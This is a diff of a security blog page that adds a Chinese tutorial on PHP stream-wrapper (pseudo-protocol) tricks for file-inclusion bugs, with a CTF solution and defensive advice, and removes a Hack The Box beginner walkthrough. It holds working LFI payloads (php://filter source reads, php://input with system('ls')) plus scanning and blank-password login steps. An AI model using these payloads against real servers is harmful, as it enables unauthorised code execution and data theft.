+<p>对称密码分为两类：分组密码和流密码（RC体系），除了RC体系其他都是分组密码。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/08/03/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%E4%B8%8ECTF%E7%A4%BA%E4%BE%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/kehan.jpg">
+      <meta itemprop="name" content="Aono">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aono Note">
+      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Aono Note">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/03/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%E4%B8%8ECTF%E7%A4%BA%E4%BE%8B/" class="post-title-link" itemprop="url">PHP伪协议详解与CTF示例</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-08-03 17:21:34 / 修改时间：17:25:36" itemprop="dateCreated datePublished" datetime="2026-08-03T17:21:34+08:00">2026-08-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="PHP伪协议详解与CTF示例"><a href="#PHP伪协议详解与CTF示例" class="headerlink" title="PHP伪协议详解与CTF示例"></a>PHP伪协议详解与CTF示例</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在 Web 安全以及 CTF 竞赛中，<strong>文件包含漏洞（File Inclusion, LFI/RFI）</strong> 是一种极其常见的漏洞类型。而在利用文件包含漏洞时，<strong>PHP 伪协议（PHP Pseudo-protocols / Stream Wrappers）</strong> 无疑是我们手中最强大的工具之一。本文将对 PHP 伪协议的分类、原理进行系统梳理，并通过一个典型的 CTF 题目加深理解。</p>
+<h2 id="一、什么是-PHP-伪协议？"><a href="#一、什么是-PHP-伪协议？" class="headerlink" title="一、什么是 PHP 伪协议？"></a>一、什么是 PHP 伪协议？</h2><p>PHP 带有许多内置的<strong>流包装器（Stream Wrappers）</strong>，即我们常说的“伪协议”。它允许开发者像访问本地文件一样去操作各种不同的数据源（例如网络请求、标准输入输出流、Base64 字符流、压缩包等）。</p>
+<p>在代码中，像 <code>include()</code>, <code>require()</code>, <code>file_get_contents()</code>, <code>file_put_contents()</code> 等文件操作函数，如果传入的参数可控且使用了伪协议，就会触发不一样的逻辑。</p>
+<h3 id="1-1-关键配置项-php-ini"><a href="#1-1-关键配置项-php-ini" class="headerlink" title="1.1 关键配置项 (php.ini)"></a>1.1 关键配置项 (<code>php.ini</code>)</h3><p>伪协议能否生效，很大程度上取决于 PHP 的配置文件 <code>php.ini</code> 中的两个核心参数：</p>
+<ul>
+<li><code>allow_url_fopen</code>：是否允许将 URL 当作文件打开（默认开启 <code>On</code>）。</li>
+<li><code>allow_url_include</code>：是否允许将 URL 作为 <code>include/require</code> 的参数包含（<strong>非常关键</strong>，默认关闭 <code>Off</code>）。</li>
+</ul>
+<h3 id="1-2-常见伪协议一览表"><a href="#1-2-常见伪协议一览表" class="headerlink" title="1.2 常见伪协议一览表"></a>1.2 常见伪协议一览表</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">伪协议</th>
+<th style="text-align:left">主要作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>file://</code></td>
+<td style="text-align:left">访问本地文件系统</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>php://filter</code></td>
+<td style="text-align:left">对读取/写入的流进行过滤处理（常用于<strong>读源码</strong>）</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>php://input</code></td>
+<td style="text-align:left">读取 POST 原始数据（常用于<strong>命令执行</strong>）</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>data://</code></td>
+<td style="text-align:left">直接传输数据流（常用于<strong>命令执行</strong>）</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>http://</code><strong> / </strong><code>https://</code></td>
+<td style="text-align:left">远程文件包含（RFI）</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>phar://</code><strong> / </strong><code>zip://</code></td>
+<td style="text-align:left">解压并读取压缩包内的文件</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="二、核心伪协议深入剖析"><a href="#二、核心伪协议深入剖析" class="headerlink" title="二、核心伪协议深入剖析"></a>二、核心伪协议深入剖析</h2><p>在实际渗透和解题中，使用频率最高的应该是 <code>php://filter</code> 和 <code>php://input</code>。</p>
+<h3 id="2-1-php-filter（读取源码）"><a href="#2-1-php-filter（读取源码）" class="headerlink" title="2.1 php://filter（读取源码）"></a>2.1 <code>php://filter</code>（读取源码）</h3><p><strong>原理</strong>：<code>php://filter</code> 允许在“读取文件内容”与“代码被 PHP 解析”之间插入一个<strong>过滤器（Filter）</strong>。</p>
+<p>如果我们直接用 <code>include(&quot;flag.php&quot;)</code>，PHP 会将 <code>flag.php</code> 里的代码当场<strong>解析并执行</strong>，前端页面只能看到执行结果，拿不到变量 <code>$flag = &quot;xxx&quot;</code> 的源码。但如果使用 <code>php://filter</code> 加载 Base64 过滤器，文件内容就会被转换成 Base64 文本返回，<strong>避免了被 PHP 当作代码执行</strong>。</p>
+<p><strong>通用语法格式</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/[读写模式]=[过滤器名称]/resource=[目标文件]</span><br></pre></td></tr></table></figure>
+<p><strong>常用 Payload</strong>（以 Base64 编码读取 <code>flag.php</code> 为例）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h3 id="2-2-php-input（任意代码执行）"><a href="#2-2-php-input（任意代码执行）" class="headerlink" title="2.2 php://input（任意代码执行）"></a>2.2 <code>php://input</code>（任意代码执行）</h3><p><strong>原理</strong>：可以读取请求中的 <strong>Raw POST Data（原始 POST 报文主体）</strong>。当它被 <code>include</code> 包含时，POST 请求体里的内容就会被当作 PHP 代码直接执行。</p>
+<p><strong>常用 Payload</strong>：</p>
+<ul>
+<li><strong>请求 URL</strong>：<code>http://target.com/index.php?file=php://input</code></li>
+<li><strong>POST 请求体内容</strong>：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><em>(注意：使用此协议需 </em><code>allow_url_include = On</code><em>)</em></p>
+<h2 id="三、-ACTF2020-新生赛-Include"><a href="#三、-ACTF2020-新生赛-Include" class="headerlink" title="三、[ACTF2020 新生赛]Include"></a>三、<code>[ACTF2020 新生赛]Include</code></h2><h3 id="3-1-题目场景与源码分析"><a href="#3-1-题目场景与源码分析" class="headerlink" title="3.1 题目场景与源码分析"></a>3.1 题目场景与源码分析</h3><p>访问题目页面，发现 URL 带有明显的参数：<br><code>http://challenge.site/index.php?file=flag.php</code></p>
+<p>页面只显示了一句类似于 <em>“Can you find flag?”</em> 的提示，并没有直接把 Flag 印在页面上。</p>
+<p>假设后端的代码逻辑如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">// 存在本地文件包含漏洞</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome! Try ?file=flag.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>分析原因</strong>：<code>flag.php</code> 中的源码可能是这样的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;flag&#123;a1b2c3d4-e5f6-7890-php_pseudo_protocol&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>因为变量 <code>$flag</code> 被直接载入内存，并没有被 <code>echo</code> 出来，直接请求 <code>?file=flag.php</code> 页面自然一片空白。</p>
+<h3 id="3-2-构造-Payload-解题"><a href="#3-2-构造-Payload-解题" class="headerlink" title="3.2 构造 Payload 解题"></a>3.2 构造 Payload 解题</h3><p>为了不让 PHP 执行 <code>flag.php</code>，我们需要把它的源码以 Base64 文本形式拿出来。</p>
+<h4 id="第一步：构造-php-filter-协议-URL"><a href="#第一步：构造-php-filter-协议-URL" class="headerlink" title="第一步：构造 php://filter 协议 URL"></a>第一步：构造 <code>php://filter</code> 协议 URL</h4><p>在浏览器参数中输入：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.site/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h4 id="第二步：获取响应结果"><a href="#第二步：获取响应结果" class="headerlink" title="第二步：获取响应结果"></a>第二步：获取响应结果</h4><p>回车发送请求后，页面上不再是原本的提示，而是渲染出了一串 Base64 编码后的文本：</p>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgCiRmbGFnID0gImZsYWd7YTFiMmMzZDQtZTVmNi03ODkwLXBocF9wc2V1ZG9fcHJvdG9jb2x9IjsKPz4=</span><br></pre></td></tr></table></figure>
+<h4 id="第三步：解码拿-Flag"><a href="#第三步：解码拿-Flag" class="headerlink" title="第三步：解码拿 Flag"></a>第三步：解码拿 Flag</h4><p>打开命令行或在线解码工具，对该字符串进行 Base64 解码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;PD9waHAgCiRmbGFnID0gImZsYWd7YTFiMmMzZDQtZTVmNi03ODkwLXBocF9wc2V1ZG9fcHJvdG9jb2x9IjsKPz4=&quot;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure>
+<p><strong>解码结果</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;a1b2c3d4-e5f6-7890-php_pseudo_protocol&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>成功拿到原原本本的 <code>flag.php</code> 源码及 Flag！</p>
+<h2 id="四、开发与防御建议"><a href="#四、开发与防御建议" class="headerlink" title="四、开发与防御建议"></a>四、开发与防御建议</h2><p>从安全角度来看，造成伪协议被恶意利用的根源是<strong>不安全的动态文件包含</strong>。要防止此类漏洞，建议采取以下防御措施：</p>
+<ol>
+<li><strong>禁用敏感配置</strong>：在 <code>php.ini</code> 中确保关闭 <code>allow_url_include = Off</code>。</li>
+<li><strong>白名单映射</strong>：不要直接将用户可控的参数传入 <code>include()</code> / <code>require()</code>，建议采用固定映射字典：</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allowed_pages</span> = [</span><br><span class="line">    <span class="string">&#x27;home&#x27;</span> =&gt; <span class="string">&#x27;pages/home.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;about&#x27;</span> =&gt; <span class="string">&#x27;pages/about.php&#x27;</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$allowed_pages</span>[<span class="variable">$page</span>])) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$allowed_pages</span>[<span class="variable">$page</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol>
+<li><strong>严格过滤输入</strong>：使用 <code>basename()</code> 或禁止 <code>/</code>, <code>\</code>, <code>php://</code>, <code>data://</code> 等特殊字符。</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PHP 伪协议是 Web 安全很常见的内容。总结起来：</p>
+<ul>
+<li>要读源码，首选 <code>php://filter</code>（配合 Base64 编码）。</li>
+<li>要拿 Shell/执行命令，可考虑 <code>php://input</code> 或 <code>data://</code>（需配合 <code>allow_url_include=On</code>）。</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1122,1346 +2106,8 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/05/17/Hackthebox-StartingPoint-Tier0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/kehan.jpg">
-      <meta itemprop="name" content="Aono">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Aono Note">
-      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Aono Note">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/05/17/Hackthebox-StartingPoint-Tier0/" class="post-title-link" itemprop="url">Hackthebox-StartingPoint-Tier0</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2026-05-17 20:30:07 / 修改时间：20:36:24" itemprop="dateCreated datePublished" datetime="2026-05-17T20:30:07+08:00">2026-05-17</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/HTB/" itemprop="url" rel="index"><span itemprop="name">HTB</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Tier0起点包含了：Meow、Fawn、Dancing和Redeemer4个非vip靶场，侧重于渗透测试的基本构建模块。</p>
-<h1 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h1><p>1.What does the acronym VM stand for?</p>
-<p>VM 这个缩写代表什么？</p>
-<p>Virtual Machine</p>
-<p>2.What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It’s also known as a console or shell.</p>
-<p>我们使用什么工具与操作系统交互，以便通过命令行发出命令，例如启动 VPN 连接的命令？它也被称为控制台或 shell。</p>
-<p>Terminal</p>
-<p>3.What service do we use to form our VPN connection into HTB labs?</p>
-<p>我们使用什么服务来建立与 HTB 实验室的 VPN 连接？</p>
-<p>openvpn</p>
-<p>4.What tool do we use to test our connection to the target with an ICMP echo request?</p>
-<p>我们使用什么工具来测试与目标设备的 ICMP 回显请求连接？</p>
-<p>ping</p>
-<p>5.What is the name of the most common tool for finding open ports on a target?</p>
-<p>查找目标系统上开放端口最常用的工具叫什么名字？</p>
-<p>nmap</p>
-<p>6.What service do we identify on port 23/tcp during our scans?</p>
-<p>我们在扫描过程中，在 23/tcp 端口上识别出了什么服务？</p>
-<p>telent</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- -v -min-rate 1000 10.129.125.52</span><br><span class="line"></span><br><span class="line">Discovered open port 23/tcp on 10.129.125.52</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">23/tcp open  telnet</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>7.What username is able to log into the target over telnet with a blank password?</p>
-<p>哪个用户名可以使用空密码通过 telnet 登录到目标主机？</p>
-<p>root</p>
-<p>8.Submit root flag  提交根标志</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.129.125.52</span><br><span class="line">Trying 10.129.125.52...</span><br><span class="line">Connected to 10.129.125.52.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line"></span><br><span class="line">  █  █         ▐▌     ▄█▄ █          ▄▄▄▄</span><br><span class="line">  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀</span><br><span class="line">  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Meow login: root</span><br><span class="line">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)</span><br><span class="line">Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0</span><br><span class="line">root@Meow:~# <span class="built_in">ls</span></span><br><span class="line">flag.txt  snap</span><br><span class="line">root@Meow:~# <span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure>
-<h1 id="Fawn"><a href="#Fawn" class="headerlink" title="Fawn"></a>Fawn</h1><p>1.What does the 3-letter acronym FTP stand for?</p>
-<p>FTP 这三个字母的缩写代表什么？</p>
-<p>File Transfer Protocol</p>
-<p>2.Which port does the FTP service listen on usually?</p>
-<p>FTP 服务通常监听哪个端口？</p>
-<p>21</p>
-<p>3.FTP sends data in the clear, without any encryption. What acronym is used for a later protocol designed to provide similar functionality to FTP but securely, as an extension of the SSH protocol?</p>
-<p>FTP 以明文形式发送数据，不进行任何加密。后来出现了一种协议，旨在提供与 FTP 类似的功能，但更加安全，它是 SSH 协议的扩展，该协议的缩写是什么？</p>
-<p>SFTP</p>
-<p>4.What is the command we can use to send an ICMP echo request to test our connection to the target?</p>
-<p>我们可以使用什么命令发送 ICMP 回显请求来测试与目标的连接？</p>
-<p>ping</p>
-<p>5.From your scans, what version is FTP running on the target?</p>
-<p>根据扫描结果，目标主机上运行的是哪个版本的 FTP？</p>
-<p>vsftpd 3.0.3</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p 21 -sCV 10.129.125.53</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> nmap -p 21 -sCV 10.129.125.53</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> zyu:</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 23:28 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.125.53)</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.10.17.43</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>6.From your scans, what OS type is running on the target?</p>
-<p>根据扫描结果，目标设备运行的是哪种操作系统？</p>
-<p>Unix</p>
-<p>7.What is the command we need to run in order to display the ‘ftp’ client help menu?</p>
-<p>要显示“ftp”客户端的帮助菜单，我们需要运行什么命令？</p>
-<p>ftp -?</p>
-<p>8.What is username that is used over FTP when you want to log in without having an account?</p>
-<p>当您想在没有帐户的情况下通过 FTP 登录时，使用的用户名是什么？</p>
-<p>anonymous</p>
-<p>9.What is the response code we get for the FTP message ‘Login successful’?</p>
-<p>对于“登录成功”的 FTP 消息，我们得到的响应代码是什么？</p>
-<p>230</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.129.125.53</span><br><span class="line">Connected to 10.129.125.53.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (10.129.125.53:zyu): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>10.There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.</p>
-<p>我们可以使用几个命令来列出 FTP 服务器上可用的文件和目录。一个是 dir 命令。另一个是 Linux 系统上常用的文件列表命令是什么？</p>
-<p>ls</p>
-<p>11.What is the command used to download the file we found on the FTP server?</p>
-<p>用来下载我们在 FTP 服务器上找到的文件的命令是什么？</p>
-<p>get</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get flag.txt</span><br><span class="line"><span class="built_in">local</span>: flag.txt remote: flag.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||35044|)</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> flag.txt (32 bytes).</span><br><span class="line">100% |*******************************************************************************************************************|    32      105.57 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">32 bytes received <span class="keyword">in</span> 00:01 (0.02 KiB/s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>12.cat flag.txt</p>
-<h1 id="Dancing"><a href="#Dancing" class="headerlink" title="Dancing"></a>Dancing</h1><p>1.What does the 3-letter acronym SMB stand for?</p>
-<p>SMB 这三个字母的缩写代表什么？</p>
-<p> Server Message Block  </p>
-<p>2.What port does SMB use to operate at?</p>
-<p>SMB 协议使用哪个端口运行？</p>
-<p>445</p>
-<p>3.What is the service name for port 445 that came up in our Nmap scan?</p>
-<p>我们在 Nmap 扫描中发现的 445 端口的服务名称是什么？</p>
-<p>microsoft-ds</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p 445 -sCV 10.129.125.72</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> zyu:</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 02:35 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.125.72)</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   <span class="built_in">date</span>: 2026-05-11T10:36:35</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: 3h59m58s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>4.What is the ‘flag’ or ‘switch’ that we can use with the smbclient utility to ‘list’ the available SMB shares on Dancing?</p>
-<p>我们可以使用 smbclient 工具的哪个“标志”或“开关”来“列出”Dancing 上可用的 SMB 共享？</p>
-<p>-L</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.129.125.72</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\zyu]:</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        WorkShares      Disk</span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 10.129.125.72 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>
-<p>SMB 的 445/tcp 端口已启动并运行，它就像一个共享文件夹。我们可以使用命令 smbclient -L {targetIP} 来枚举其内容。</p>
-<p>5.How many shares are there on Dancing?</p>
-<p>Dancing 有多少共享文件夹？</p>
-<p>4</p>
-<p>6.What is the name of the share we are able to access in the end with a blank password?</p>
-<p>最后，我们不用密码就能访问哪个共享文件夹？</p>
-<p>WorkShares</p>
